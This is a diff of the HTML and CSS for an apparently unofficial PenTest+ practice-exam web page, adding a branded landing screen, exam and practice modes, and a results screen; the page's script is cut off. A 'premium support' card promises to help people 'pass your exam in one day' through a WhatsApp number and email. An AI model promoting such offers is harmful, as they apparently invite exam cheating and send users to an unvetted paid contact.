@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+<!-- saved from url=(0032)https://wguexams.github.io/D332/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-Q98PCV1Q15"></script>
 <script>
@@ -9,12 +9,14 @@
   gtag('js', new Date());
   gtag('config', 'G-Q98PCV1Q15');
 </script>
-<meta charset="UTF-8">
+
 <title>WGUEXAMS — PenTest+ Practice Exam</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="preconnect" href="https://fonts.googleapis.com/">
-<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@600;700&family=IBM+Plex+Mono:wght@500;600&display=swap" rel="stylesheet">
+<meta name="theme-color" content="#001731">
+<meta property="og:title" content="WGU Exams — PenTest+ Practice Exam"><meta property="og:description" content="Free interactive PenTest+ (PT0-003) practice. No sign-up."><meta property="og:type" content="website">
 <style>
 
 :root{
@@ -261,29 +263,194 @@ table.ck td.cb{text-align:center;white-space:nowrap;}
 .cmdlist li{font:12.5px/1.6 'IBM Plex Mono',monospace;padding:2px 0;color:var(--text-dim);}
 .cmdnote{font-size:.8rem;color:var(--text-faint);padding:8px 16px 12px;background:var(--panel);}
 
+/* ═════════ WGU BRAND RESTYLE (matches wguexams.github.io) ═════════ */
+:root{--cyan:#0070F0;--cyan-dim:#002855;--bg:#EEF6F9;--panel-3:#EEF6F9;}
+body{background:#EEF6F9;}
+
+/* landing */
+#landingScreen{min-height:100vh;background:linear-gradient(180deg,#001731 0%,#002855 45%,#001f44 100%);color:#fff;position:relative;overflow:hidden;isolation:isolate;padding:0 1.25rem 2.5rem;}
+#landingScreen::before{content:"";position:absolute;inset:0;z-index:-1;
+  background-image:linear-gradient(rgba(255,255,255,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.045) 1px,transparent 1px);background-size:44px 44px;
+  mask-image:radial-gradient(ellipse 80% 70% at 50% 20%,#000 25%,transparent 75%);-webkit-mask-image:radial-gradient(ellipse 80% 70% at 50% 20%,#000 25%,transparent 75%);}
+#landingScreen::after{content:"";position:absolute;z-index:-1;width:1100px;height:700px;left:50%;top:-380px;transform:translateX(-50%);
+  background:radial-gradient(ellipse 30% 45% at 35% 50%,rgba(0,112,240,.55),transparent 100%),radial-gradient(ellipse 30% 45% at 65% 45%,rgba(70,177,239,.45),transparent 100%),radial-gradient(ellipse 28% 35% at 50% 75%,rgba(151,225,82,.2),transparent 100%);}
+.ls-hero{max-width:760px;margin:0 auto;padding:3.6rem 0 2.6rem;text-align:center;}
+.ls-brand{display:inline-flex;align-items:center;gap:10px;color:#cbd5e1;text-decoration:none;font:600 15px 'Space Grotesk',sans-serif;margin-bottom:26px;}
+.ls-brand:hover{color:#fff;}
+.ls-mark{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0070F0,#46B1EF);box-shadow:0 8px 24px rgba(0,112,240,.5);}
+.ls-mark svg{width:19px;height:19px;color:#fff;}
+.ls-pill{display:inline-flex;align-items:center;gap:8px;font:600 12px 'IBM Plex Mono',monospace;letter-spacing:.4px;color:#cfe9fb;background:rgba(70,177,239,.14);border:1px solid rgba(70,177,239,.4);padding:6px 13px;border-radius:99px;margin-bottom:20px;}
+.ls-dot{width:7px;height:7px;border-radius:50%;background:#97E152;animation:lsPing 2s infinite;}
+@keyframes lsPing{0%{box-shadow:0 0 0 0 rgba(151,225,82,.6);}70%{box-shadow:0 0 0 8px rgba(151,225,82,0);}100%{box-shadow:0 0 0 0 rgba(151,225,82,0);}}
+#landingScreen h1{font:700 clamp(36px,6.4vw,58px)/1.04 'Space Grotesk',sans-serif;letter-spacing:-1.4px;margin:0 0 16px;}
+.ls-hl{background:linear-gradient(90deg,#46B1EF,#97E152 50%,#46B1EF);background-size:200% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:lsShine 6s linear infinite;}
+@keyframes lsShine{to{background-position:200% center;}}
+.ls-sub{font-size:16.5px;line-height:1.6;color:#94a3b8;max-width:520px;margin:0 auto 28px;}
+.ls-stats{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-bottom:30px;}
+.ls-stat{min-width:120px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:12px 18px;}
+.ls-stat b{display:block;font:700 24px 'Space Grotesk',sans-serif;color:#fff;}
+.ls-stat span{font-size:12.5px;color:#94a3b8;}
+.ls-cta{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;}
+.ls-begin{display:inline-flex;align-items:center;gap:10px;font:700 17px 'Space Grotesk',sans-serif;padding:16px 34px;border-radius:12px;border:0;cursor:pointer;color:#fff;background:#0070F0;box-shadow:0 0 0 1px rgba(255,255,255,.1) inset,0 12px 32px rgba(0,112,240,.55);transition:transform .15s,box-shadow .15s,background .15s;}
+.ls-begin:hover{transform:translateY(-2px);background:#1a80f5;box-shadow:0 16px 38px rgba(0,112,240,.65);}
+.ls-ghost{display:inline-flex;align-items:center;gap:8px;font:600 15.5px 'Space Grotesk',sans-serif;padding:16px 24px;border-radius:12px;color:#e2e8f0;text-decoration:none;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.16);transition:all .15s;}
+.ls-ghost:hover{background:rgba(255,255,255,.12);transform:translateY(-2px);}
+
+.ls-cards{max-width:820px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.ls-card{background:#fff;color:#12161c;border:1px solid #d6e6f2;border-radius:18px;padding:1.7rem 1.4rem 1.5rem;text-align:center;box-shadow:0 18px 40px rgba(0,10,30,.35);display:flex;flex-direction:column;}
+.ls-icon{width:52px;height:52px;border-radius:14px;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;background:linear-gradient(135deg,#0070F0,#46B1EF);box-shadow:0 10px 26px rgba(0,112,240,.4);}
+.ls-icon svg{width:26px;height:26px;}
+.ls-kicker{font:600 11px 'IBM Plex Mono',monospace;letter-spacing:1px;color:#4d8a1f;margin-bottom:6px;}
+.ls-card h3{font:700 20px 'Space Grotesk',sans-serif;color:#002855;margin:0 0 6px;}
+.ls-card p{font-size:14px;line-height:1.55;color:#48505c;margin:0 0 16px;}
+.ls-qr{display:flex;align-items:center;justify-content:space-between;gap:12px;text-align:left;background:#EEF6F9;border:1px solid #cfe2ef;border-radius:12px;padding:8px 14px 8px 8px;margin-bottom:14px;font:11.5px/1.5 'IBM Plex Mono',monospace;color:#48505c;}
+.ls-qr svg{width:72px;height:72px;border:1px solid #d6e6f2;border-radius:6px;padding:3px;background:#fff;flex:none;}
+.ls-num{display:inline-block;margin-top:4px;font:600 13.5px 'IBM Plex Mono',monospace;color:#002855;text-decoration:none;}
+.ls-num:hover{color:#0070F0;}
+.ls-btn{margin-top:auto;display:flex;align-items:center;justify-content:center;gap:8px;font:600 15.5px 'Space Grotesk',sans-serif;padding:13px 20px;border-radius:11px;color:#fff;text-decoration:none;background:#0070F0;box-shadow:0 10px 26px rgba(0,112,240,.35);transition:transform .15s,background .15s;}
+.ls-btn:hover{transform:translateY(-2px);background:#1a80f5;}
+.ls-btn svg{width:18px;height:18px;}
+.ls-coffee{background:#FFDD00;color:#000;box-shadow:0 10px 26px rgba(255,221,0,.3);}
+.ls-coffee:hover{background:#ffe433;}
+.ls-mail{display:block;margin-top:12px;font:12px 'IBM Plex Mono',monospace;color:#0070F0;text-decoration:none;}
+.ls-mail:hover{text-decoration:underline;}
+.ls-foot{text-align:center;font-size:12px;color:#7d9ab8;margin:2.2rem 0 0;}
+@media(max-width:720px){.ls-cards{grid-template-columns:1fr;}.ls-qr{display:none;}.ls-hero{padding-top:2.6rem;}}
+
+/* exam chrome in WGU blues */
+.examtop{background:linear-gradient(180deg,#002855,#001f44);}
+.examflagbar{background:#0070F0;}
+.examflagbtn{color:#fff;}
+.examflagbtn.flagged{background:#fff;color:#b5390b;}
+#examBottom{background:linear-gradient(180deg,#001f44,#002855);}
+.doc-btn,.qread-bar{background:linear-gradient(180deg,#0070F0,#005fd0);}
+.btn-primary{background:#0070F0;}
+.analysis h3{color:#0070F0;}
+.pm-mail{display:inline-flex;align-items:center;justify-content:center;gap:8px;margin-top:12px;font:600 13.5px 'IBM Plex Mono',monospace;color:#002855;text-decoration:none;padding:8px 14px;border-radius:9px;background:#EEF6F9;border:1px solid #cfe2ef;transition:background .15s,color .15s;align-self:center;}
+.pm-mail:hover{background:#dcebfd;color:#0070F0;}
+.pm-mail svg{width:17px;height:17px;color:#0070F0;flex:none;}
+.ls-cards{grid-template-columns:1fr;max-width:440px;}
+.ls-card .ls-btn{margin-top:0;}
+.ls-card .ls-btn + .ls-btn{margin-top:10px;}
+.ls-card .ls-qr + .ls-btn{margin-top:auto;}
+.mcq-stem{font-size:16px;line-height:1.7;color:var(--text);margin:0 0 18px;max-width:900px;font-weight:500;}
+.mcq-stem code,.mcq-text code{font-family:'IBM Plex Mono',monospace;font-size:12.5px;background:var(--panel-2);border:1px solid var(--border-soft);padding:1px 6px;border-radius:4px;}
+.mcq-list{border:1px solid var(--border-soft);max-width:900px;}
+.mcq-list .chk{font-size:14px;line-height:1.5;align-items:flex-start;}
+.mcq-list .chk input{margin-top:2px;}
+.mcq-letter{flex:none;width:24px;height:24px;border-radius:6px;background:#dcebfd;color:#002855;font:700 12.5px 'Space Grotesk',sans-serif;display:flex;align-items:center;justify-content:center;}
+.mcq-text{flex:1;min-width:0;}
+.mcq-list .chk.mcq-right{background:#e8f8ee;}
+.mcq-list .chk.mcq-wrong{background:#fdecec;}
+.section.mcq .analysis p{max-width:900px;}
+.sev-chip.chip-mcq{background:#dcebfd;color:#002855;border-color:#9fcdf2;}
+/* modes */
+.ls-modes{display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:640px;margin:0 auto 16px;}
+.ls-mode{display:flex;gap:14px;align-items:flex-start;text-align:left;cursor:pointer;padding:18px 18px;border-radius:14px;color:#fff;
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.18);font-family:'Inter',sans-serif;transition:transform .15s,background .15s,border-color .15s;}
+.ls-mode:hover{transform:translateY(-2px);background:rgba(255,255,255,.11);border-color:rgba(70,177,239,.6);}
+.ls-mode-exam{background:#0070F0;border-color:#0070F0;box-shadow:0 12px 32px rgba(0,112,240,.5);}
+.ls-mode-exam:hover{background:#1a80f5;border-color:#1a80f5;}
+.ls-mode-ico{flex:none;width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.14);}
+.ls-mode-ico svg{width:21px;height:21px;}
+.ls-mode-txt b{display:block;font:700 17px 'Space Grotesk',sans-serif;margin-bottom:4px;}
+.ls-mode-txt span{font-size:13px;line-height:1.45;color:#d6e4f5;}
+@media(max-width:640px){.ls-modes{grid-template-columns:1fr;}}
+
+/* exam mode: never reveal */
+body.exam-mode .actions, body.exam-mode .analysis{display:none !important;}
+#finishBtn{display:none;}
+body.exam-mode #finishBtn.on-last{display:flex;background:#97E152;color:#001731;border-color:#97E152;}
+body.exam-mode #finishBtn:hover{background:#a9ea6c;}
+body.practice-mode #examTimerText{font-weight:600;}
+
+/* results */
+#resultsScreen{display:none;min-height:100vh;background:linear-gradient(180deg,#001731 0%,#002855 45%,#001f44 100%);color:#fff;padding:0 1.25rem 3rem;}
+.rs-inner{max-width:760px;margin:0 auto;padding:4rem 0 0;text-align:center;}
+#resultsScreen h1{font:700 clamp(30px,5vw,44px) 'Space Grotesk',sans-serif;margin:0 0 18px;}
+.rs-score{display:inline-flex;align-items:center;gap:18px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:18px 30px;margin-bottom:14px;}
+.rs-score b{font:700 56px 'Space Grotesk',sans-serif;line-height:1;}
+.rs-score span{font:700 14px 'IBM Plex Mono',monospace;letter-spacing:1px;padding:6px 12px;border-radius:8px;}
+.rs-score span.pass{background:#97E152;color:#001731;}
+.rs-score span.fail{background:#fde2e2;color:#8a1f24;}
+.rs-sub{color:#94a3b8;font-size:14px;margin:0 0 26px;}
+.rs-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;text-align:left;margin-bottom:18px;}
+.rs-dom{background:#fff;color:#12161c;border-radius:12px;padding:14px 16px;}
+.rs-dom-top{display:flex;justify-content:space-between;gap:10px;font:600 14px 'Space Grotesk',sans-serif;color:#002855;margin-bottom:8px;}
+.rs-bar{height:8px;border-radius:99px;background:#EEF6F9;overflow:hidden;margin-bottom:6px;}
+.rs-bar i{display:block;height:100%;background:linear-gradient(90deg,#0070F0,#46B1EF);border-radius:99px;}
+.rs-dom small{color:#48505c;font-size:12px;}
+.rs-note{color:#a9d8f6;font-size:13px;margin:0 0 20px;}
+.rs-btns{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+.rs-btns .ls-begin,.rs-btns .ls-ghost{font-size:15px;padding:13px 22px;cursor:pointer;font-family:'Space Grotesk',sans-serif;}
+@media(max-width:640px){.rs-grid{grid-template-columns:1fr;}}
+
+/* confirm modal */
+.cm-overlay{position:fixed;inset:0;background:rgba(0,10,30,.6);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
+.cm-overlay.show{display:flex;}
+.cm-box{background:#fff;border-radius:14px;max-width:420px;width:100%;padding:22px 22px 18px;box-shadow:0 30px 70px rgba(0,0,0,.35);}
+.cm-box h3{margin:0 0 8px;font:700 19px 'Space Grotesk',sans-serif;color:#002855;}
+.cm-box p{margin:0 0 18px;color:#48505c;font-size:14px;line-height:1.55;}
+.cm-btns{display:flex;justify-content:flex-end;gap:10px;}
+.ls-cta .ls-ghost{width:100%;max-width:640px;justify-content:center;font-size:18px;padding:18px 28px;border-radius:14px;gap:10px;border-color:rgba(255,255,255,.28);background:rgba(255,255,255,.08);}
+.ls-cta .ls-ghost svg{width:20px;height:20px;}
+.ls-cta .ls-ghost:hover{background:rgba(255,255,255,.14);border-color:rgba(70,177,239,.7);}
 </style>
-</head>
+<style id="dark-reader-style" type="text/css">@media screen {
+
+}</style></head>
 <body>
 
 <div id="landingScreen">
-  <div class="menu-inner">
-    <div class="menu-top">
-      <h1>WGUEXAMS — PenTest+ Practice Exam</h1>
-      <div class="menu-sub">6 performance-based questions — choose a question to begin</div>
+  <div class="ls-hero">
+    <a class="ls-brand" href="https://wguexams.github.io/">
+      <span class="ls-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg></span>
+      WGU Exams
+    </a>
+    <div><span class="ls-pill"><span class="ls-dot"></span>D332 · PENTEST+ · PT0-003</span></div>
+    <h1>PenTest+ <span class="ls-hl">Practice Exam</span></h1>
+    <p class="ls-sub">Hands-on performance-based questions built around the PT0-003 skills — classify the finding, pick the right tool, and choose the fix. A multiple-choice bank is on the way.</p>
+
+    <div class="ls-stats">
+      <div class="ls-stat"><b id="pbqCount">2</b><span>PBQs</span></div>
+      <div class="ls-stat" id="mcqStat"><b id="mcqCount">0</b><span>multiple choice</span></div>
+      <div class="ls-stat"><b>90</b><span>minute timer</span></div>
+      <div class="ls-stat"><b>Free</b><span>no sign-up</span></div>
     </div>
-    <div style="text-align:center;">
-      <a class="coffee-btn-big" href="https://buymeacoffee.com/playmaker777" target="_blank" rel="noopener">
-        <span>☕</span> Buy me a coffee
+
+    <div class="ls-modes">
+      <button class="ls-mode" id="practiceBtn" type="button">
+        <span class="ls-mode-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 014 4v14a3 3 0 00-3-3H2z"/><path d="M22 3h-6a4 4 0 00-4 4v14a3 3 0 013-3h7z"/></svg></span>
+        <span class="ls-mode-txt"><b>Practice mode</b><span>Check each answer and read the explanation as you go. No timer.</span></span>
+      </button>
+      <button class="ls-mode ls-mode-exam" id="beginBtn" type="button">
+        <span class="ls-mode-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5M9 2h6"/></svg></span>
+        <span class="ls-mode-txt"><b>Exam mode</b><span>90-minute timer, shuffled questions, no answers shown. Score at the end.</span></span>
+      </button>
+    </div>
+
+    <div class="ls-cta">
+      <a class="ls-ghost" href="https://wguexams.github.io/">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M15 6l-6 6 6 6"/></svg>
+        All courses
       </a>
     </div>
   </div>
-  <a class="exams-btn-fixed" href="https://wguexams.github.io/" target="_blank" rel="noopener">
-    <span>📚</span> Other exams
-  </a>
-  <button class="begin-btn-fixed" id="beginBtn" type="button">
-    Begin Exam
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M9 6l6 6-6 6"></path></svg>
-  </button>
+
+  <div class="ls-cards">
+    <div class="ls-card">
+      <div class="ls-icon"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 00-8.6 15.1L2 22l5-1.3A10 10 0 1012 2zm0 18.2c-1.6 0-3.1-.4-4.4-1.2l-.3-.2-3 .8.8-2.9-.2-.3A8.2 8.2 0 1112 20.2zm4.5-6.1c-.2-.1-1.5-.7-1.7-.8-.2-.1-.4-.1-.6.1l-.8 1c-.1.2-.3.2-.5.1a6.7 6.7 0 01-3.3-2.9c-.3-.4.3-.4.7-1.4.1-.2 0-.3 0-.4l-.8-1.8c-.2-.5-.4-.4-.6-.4h-.5c-.2 0-.4.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.9 1.6.7 2.3.8 3.1.6.5-.1 1.5-.6 1.7-1.2.2-.6.2-1.1.1-1.2l-.4-.2z"/></svg></div>
+      <span class="ls-kicker">★ PREMIUM SUPPORT</span>
+      <h3>Need more help passing?</h3>
+      <p>I can help you pass your exam in one day.</p>
+      <div class="ls-qr"><svg viewBox="0 0 27 27" xmlns="http://www.w3.org/2000/svg" shape-rendering="crispEdges" role="img" aria-label="WhatsApp QR code"><rect width="27" height="27" fill="#fff"/><path fill="#000" d="M1,1H2V2H1zM2,1H3V2H2zM3,1H4V2H3zM4,1H5V2H4zM5,1H6V2H5zM6,1H7V2H6zM7,1H8V2H7zM10,1H11V2H10zM11,1H12V2H11zM12,1H13V2H12zM13,1H14V2H13zM14,1H15V2H14zM17,1H18V2H17zM19,1H20V2H19zM20,1H21V2H20zM21,1H22V2H21zM22,1H23V2H22zM23,1H24V2H23zM24,1H25V2H24zM25,1H26V2H25zM1,2H2V3H1zM7,2H8V3H7zM9,2H10V3H9zM13,2H14V3H13zM15,2H16V3H15zM19,2H20V3H19zM25,2H26V3H25zM1,3H2V4H1zM3,3H4V4H3zM4,3H5V4H4zM5,3H6V4H5zM7,3H8V4H7zM9,3H10V4H9zM10,3H11V4H10zM11,3H12V4H11zM12,3H13V4H12zM15,3H16V4H15zM16,3H17V4H16zM17,3H18V4H17zM19,3H20V4H19zM21,3H22V4H21zM22,3H23V4H22zM23,3H24V4H23zM25,3H26V4H25zM1,4H2V5H1zM3,4H4V5H3zM4,4H5V5H4zM5,4H6V5H5zM7,4H8V5H7zM9,4H10V5H9zM10,4H11V5H10zM12,4H13V5H12zM13,4H14V5H13zM14,4H15V5H14zM15,4H16V5H15zM19,4H20V5H19zM21,4H22V5H21zM22,4H23V5H22zM23,4H24V5H23zM25,4H26V5H25zM1,5H2V6H1zM3,5H4V6H3zM4,5H5V6H4zM5,5H6V6H5zM7,5H8V6H7zM12,5H13V6H12zM15,5H16V6H15zM19,5H20V6H19zM21,5H22V6H21zM22,5H23V6H22zM23,5H24V6H23zM25,5H26V6H25zM1,6H2V7H1zM7,6H8V7H7zM15,6H16V7H15zM17,6H18V7H17zM19,6H20V7H19zM25,6H26V7H25zM1,7H2V8H1zM2,7H3V8H2zM3,7H4V8H3zM4,7H5V8H4zM5,7H6V8H5zM6,7H7V8H6zM7,7H8V8H7zM9,7H10V8H9zM11,7H12V8H11zM13,7H14V8H13zM15,7H16V8H15zM17,7H18V8H17zM19,7H20V8H19zM20,7H21V8H20zM21,7H22V8H21zM22,7H23V8H22zM23,7H24V8H23zM24,7H25V8H24zM25,7H26V8H25zM9,8H10V9H9zM11,8H12V9H11zM12,8H13V9H12zM13,8H14V9H13zM1,9H2V10H1zM7,9H8V10H7zM9,9H10V10H9zM11,9H12V10H11zM12,9H13V10H12zM13,9H14V10H13zM14,9H15V10H14zM17,9H18V10H17zM18,9H19V10H18zM19,9H20V10H19zM22,9H23V10H22zM23,9H24V10H23zM24,9H25V10H24zM1,10H2V11H1zM4,10H5V11H4zM5,10H6V11H5zM9,10H10V11H9zM12,10H13V11H12zM16,10H17V11H16zM17,10H18V11H17zM20,10H21V11H20zM21,10H22V11H21zM22,10H23V11H22zM23,10H24V11H23zM24,10H25V11H24zM2,11H3V12H2zM3,11H4V12H3zM4,11H5V12H4zM7,11H8V12H7zM9,11H10V12H9zM11,11H12V12H11zM12,11H13V12H12zM13,11H14V12H13zM16,11H17V12H16zM17,11H18V12H17zM19,11H20V12H19zM20,11H21V12H20zM21,11H22V12H21zM22,11H23V12H22zM24,11H25V12H24zM25,11H26V12H25zM2,12H3V13H2zM4,12H5V13H4zM6,12H7V13H6zM18,12H19V13H18zM19,12H20V13H19zM20,12H21V13H20zM22,12H23V13H22zM25,12H26V13H25zM2,13H3V14H2zM3,13H4V14H3zM5,13H6V14H5zM6,13H7V14H6zM7,13H8V14H7zM9,13H10V14H9zM10,13H11V14H10zM11,13H12V14H11zM12,13H13V14H12zM13,13H14V14H13zM15,13H16V14H15zM16,13H17V14H16zM18,13H19V14H18zM19,13H20V14H19zM25,13H26V14H25zM1,14H2V15H1zM2,14H3V15H2zM3,14H4V15H3zM4,14H5V15H4zM6,14H7V15H6zM10,14H11V15H10zM14,14H15V15H14zM15,14H16V15H15zM16,14H17V15H16zM20,14H21V15H20zM24,14H25V15H24zM1,15H2V16H1zM4,15H5V16H4zM7,15H8V16H7zM8,15H9V16H8zM9,15H10V16H9zM10,15H11V16H10zM11,15H12V16H11zM12,15H13V16H12zM13,15H14V16H13zM16,15H17V16H16zM17,15H18V16H17zM18,15H19V16H18zM20,15H21V16H20zM21,15H22V16H21zM22,15H23V16H22zM24,15H25V16H24zM25,15H26V16H25zM1,16H2V17H1zM3,16H4V17H3zM5,16H6V17H5zM8,16H9V17H8zM10,16H11V17H10zM12,16H13V17H12zM16,16H17V17H16zM20,16H21V17H20zM22,16H23V17H22zM23,16H24V17H23zM25,16H26V17H25zM1,17H2V18H1zM3,17H4V18H3zM4,17H5V18H4zM5,17H6V18H5zM6,17H7V18H6zM7,17H8V18H7zM8,17H9V18H8zM9,17H10V18H9zM12,17H13V18H12zM13,17H14V18H13zM14,17H15V18H14zM17,17H18V18H17zM18,17H19V18H18zM19,17H20V18H19zM20,17H21V18H20zM21,17H22V18H21zM23,17H24V18H23zM9,18H10V19H9zM10,18H11V19H10zM13,18H14V19H13zM15,18H16V19H15zM17,18H18V19H17zM21,18H22V19H21zM1,19H2V20H1zM2,19H3V20H2zM3,19H4V20H3zM4,19H5V20H4zM5,19H6V20H5zM6,19H7V20H6zM7,19H8V20H7zM10,19H11V20H10zM12,19H13V20H12zM17,19H18V20H17zM19,19H20V20H19zM21,19H22V20H21zM25,19H26V20H25zM1,20H2V21H1zM7,20H8V21H7zM10,20H11V21H10zM13,20H14V21H13zM17,20H18V21H17zM21,20H22V21H21zM24,20H25V21H24zM25,20H26V21H25zM1,21H2V22H1zM3,21H4V22H3zM4,21H5V22H4zM5,21H6V22H5zM7,21H8V22H7zM10,21H11V22H10zM14,21H15V22H14zM16,21H17V22H16zM17,21H18V22H17zM18,21H19V22H18zM19,21H20V22H19zM20,21H21V22H20zM21,21H22V22H21zM23,21H24V22H23zM1,22H2V23H1zM3,22H4V23H3zM4,22H5V23H4zM5,22H6V23H5zM7,22H8V23H7zM10,22H11V23H10zM12,22H13V23H12zM13,22H14V23H13zM16,22H17V23H16zM17,22H18V23H17zM18,22H19V23H18zM19,22H20V23H19zM24,22H25V23H24zM25,22H26V23H25zM1,23H2V24H1zM3,23H4V24H3zM4,23H5V24H4zM5,23H6V24H5zM7,23H8V24H7zM14,23H15V24H14zM22,23H23V24H22zM23,23H24V24H23zM25,23H26V24H25zM1,24H2V25H1zM7,24H8V25H7zM10,24H11V25H10zM15,24H16V25H15zM17,24H18V25H17zM18,24H19V25H18zM20,24H21V25H20zM21,24H22V25H21zM25,24H26V25H25zM1,25H2V26H1zM2,25H3V26H2zM3,25H4V26H3zM4,25H5V26H4zM5,25H6V26H5zM6,25H7V26H6zM7,25H8V26H7zM9,25H10V26H9zM10,25H11V26H10zM12,25H13V26H12zM15,25H16V26H15zM17,25H18V26H17zM19,25H20V26H19zM22,25H23V26H22zM25,25H26V26H25z" id="qr-path" fill="#000000" fill-opacity="1" fill-rule="nonzero" stroke="none"/></svg><span>Scan to chat on WhatsApp<br><a class="ls-num" href="https://wa.me/19454096351" target="_blank" rel="noopener">+1 (945) 409-6351</a></span></div>
+      <a class="ls-btn" id="waBtn" href="https://wa.me/19454096351" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 00-8.6 15.1L2 22l5-1.3A10 10 0 1012 2zm0 18.2c-1.6 0-3.1-.4-4.4-1.2l-.3-.2-3 .8.8-2.9-.2-.3A8.2 8.2 0 1112 20.2zm4.5-6.1c-.2-.1-1.5-.7-1.7-.8-.2-.1-.4-.1-.6.1l-.8 1c-.1.2-.3.2-.5.1a6.7 6.7 0 01-3.3-2.9c-.3-.4.3-.4.7-1.4.1-.2 0-.3 0-.4l-.8-1.8c-.2-.5-.4-.4-.6-.4h-.5c-.2 0-.4.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.9 1.6.7 2.3.8 3.1.6.5-.1 1.5-.6 1.7-1.2.2-.6.2-1.1.1-1.2l-.4-.2z"/></svg> Get premium support</a>
+      <a class="ls-btn" id="pmMail" href="mailto:alexbestwgu@gmail.com?subject=WGU%20Exams%20-%20Premium%20Support"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg> alexbestwgu@gmail.com</a>
+      <a class="ls-btn" id="coffeeBtn" href="https://buymeacoffee.com/playmaker777" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 8h1a4 4 0 010 8h-1"/><path d="M3 8h14v9a4 4 0 01-4 4H7a4 4 0 01-4-4z"/><path d="M6 2v2M10 2v2M14 2v2"/></svg> Buy me a coffee</a>
+    </div>
+  </div>
+
+  <p class="ls-foot">Independent study resource. Not affiliated with or endorsed by Western Governors University or CompTIA.</p>
 </div>
 
 <div id="examChrome">
@@ -336,10 +503,45 @@ table.ck td.cb{text-align:center;white-space:nowrap;}
   </div>
 </div>
 
+<div id="resultsScreen">
+  <div class="rs-inner">
+    <span class="ls-pill"><span class="ls-dot"></span>EXAM COMPLETE</span>
+    <h1 id="rsTitle">Your score</h1>
+    <div class="rs-score"><b id="rsPct">0%</b><span id="rsVerdict">-</span></div>
+    <p class="rs-sub" id="rsSub"></p>
+    <div class="rs-grid" id="rsDomains"></div>
+    <p class="rs-note">Exam mode doesn't reveal answers. To see explanations, study the same questions in Practice mode.</p>
+    <div class="rs-btns">
+      <button class="ls-begin" id="retakeBtn" type="button">Retake exam (new order)</button>
+      <button class="ls-ghost" id="toPracticeBtn" type="button">Practice mode</button>
+      <button class="ls-ghost" id="rsHomeBtn" type="button">Back to start</button>
+    </div>
+  </div>
+</div>
+
+<div class="cm-overlay" id="cmOverlay">
+  <div class="cm-box">
+    <h3 id="cmTitle">Finish exam?</h3>
+    <p id="cmText"></p>
+    <div class="cm-btns">
+      <button class="btn btn-ghost" id="cmCancel" type="button">Keep working</button>
+      <button class="btn btn-primary" id="cmOk" type="button">Finish exam</button>
+    </div>
+  </div>
+</div>
+
 <div id="examBottom">
+  <button class="prevnext-btn" id="menuBtn" type="button" style="margin-right:auto;">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M3 11l9-8 9 8M5 10v10h5v-6h4v6h5V10"></path></svg>
+    Menu
+  </button>
   <button class="prevnext-btn" id="prevBtn" type="button">
     <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M15 6l-6 6 6 6"></path></svg>
     Previous
+  </button>
+  <button class="prevnext-btn finish-btn" id="finishBtn" type="button">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12l5 5L20 7"></path></svg>
+    Finish Exam
   </button>
   <button class="prevnext-btn" id="nextBtn" type="button">
     Next
@@ -349,357 +551,335 @@ table.ck td.cb{text-align:center;white-space:nowrap;}
 
 
 <script>
